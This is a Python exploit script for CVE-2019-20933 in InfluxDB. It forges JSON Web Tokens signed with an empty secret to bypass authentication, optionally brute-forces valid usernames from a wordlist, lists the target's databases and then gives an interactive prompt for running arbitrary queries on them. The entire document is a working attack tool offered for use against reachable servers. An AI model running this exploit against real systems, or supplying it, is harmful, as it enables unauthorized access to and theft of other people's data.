import json
import pathlib
import time
import urllib
import requests as requests
from influxdb import DataFrameClient
import pandas as pd
import jwt
from termcolor import colored

def bruteforceUser(filename, host, port):
    print()
    print("Start username bruteforce")
    with open(filename) as f:
        for line in f:
            line = line.replace("\n", "")
            exp = int(time.time())
            exp = exp + 2.628 * 10 ** 6  # Aggiungo un mese
            # Generation JWT
            payload = {
                "username": line,
                "exp": exp
            }

            token = jwt.encode(payload, "", algorithm="HS256")
            query = "SHOW DATABASES"
            response = makeQuery(token, 'dummy', host, port, query)
            response = json.loads(response)
            if "error" in response.keys():
                if "signature is invalid" in response['error']:
                    print(colored("ERROR: Host not vulnerable !!!", "red"))
                    print(colored("ERROR: " + response['error'] + "", "red"))
                    exit(1)
                if "user not found" in response['error']:
                    print("[{}] {}".format(colored("x", "red"), line))
            else:
                print("[{}] {}".format(colored("v", "green"), line))
                print()
                username = line
                return username

    print(colored("ERROR: no valid username found !!!", "red"))
    exit(1)

def makeQuery(token, db, host, port, query):
    try:
        headers = {
            'Authorization': 'Bearer ' + token,
        }
    except:
        token = token.decode("utf-8")
        headers = {
            'Authorization': 'Bearer ' + token,
        }

    # Send request
    query = urllib.parse.quote_plus(query)
    response = requests.get('http://' + host + ':' + str(port) + '/query?db=' + db + '&q=' + query, headers=headers)
    return response.text

def exploit():
    # imput data
    print()
    host = input("Insert ip host (default localhost): ")
    if host == "":
        host = "127.0.0.1"

    port = input("Insert port (default 8086): ")
    if port == "":
        port = 8086

    username = input("Insert influxdb user (wordlist path to bruteforce username): ")
    while username == "":
        print(colored("ERROR: empty username !!", "red"))
        username = input("Insert influxdb user: ")

    # check if username is a valid file to start bruteforce
    file = pathlib.Path(username)
    if file.exists():
        username = bruteforceUser(username, host, port)

    exp = int(time.time())
    exp = exp + 2.628 * 10 ** 6  # Aggiungo un mese

    # Generation JWT
    payload = {
        "username": username,
        "exp": exp
    }

    token = jwt.encode(payload, "", algorithm="HS256")
    #print("Token: {}".format(token))
    query = "SHOW DATABASES"
    response = makeQuery(token, 'dummy', host, port, query)
    response = json.loads(response)
    if "results" in response.keys():
        print(colored("Host vulnerable !!!", "green"))
    else:
        print(colored("ERROR: Host not vulnerable !!!", "red"))
        print(colored("ERROR: "+response['error']+"", "red"))
        return

    # Get databases list
    print("Databases list:")
    print()
    i = 1
    dblist = []
    for db in response['results'][0]['series'][0]['values']:
        print("{}) {}".format(i, db[0]))
        dblist.append(db[0])
        i += 1
    print()

    while 1 == 1:
        db = input("Insert database name (exit to close): ")
        if db == 'exit':
            return
        while db == "":
            print(colored("ERROR: empty database name !!", "red"))
            db = input("Insert database name (exit to close): ")

        query = input("[{}] Insert query (exit to change db): ".format(colored(db, "blue")))
        while username == "":
            print(colored("ERROR: empty query !!", "red"))
            query = input("Insert query: ")

        while query != "exit":
            response = makeQuery(token, db, host, port, query)
            response = json.loads(response)
            print(json.dumps(response, indent=4, sort_keys=True))
            query = input("[{}] Insert query (exit to change db): ".format(colored(db, "blue")))
            while query == "":
                print(colored("ERROR: empty query !!", "red"))
                query = input("[{}] Insert query (exit to change db): ".format(colored(db, "blue")))
        print("Databases list:")
        print()
        i=1
        for db in dblist:
            print("{}) {}".format(i, db))
            i += 1
        print()



if __name__ == '__main__':
    r = requests.get(f'http://artii.herokuapp.com/make?text=InfluxDB Exploit')
    print(colored(r.text, 'green'))
    print(colored("CVE-2019-20933", "yellow"))

    exploit()
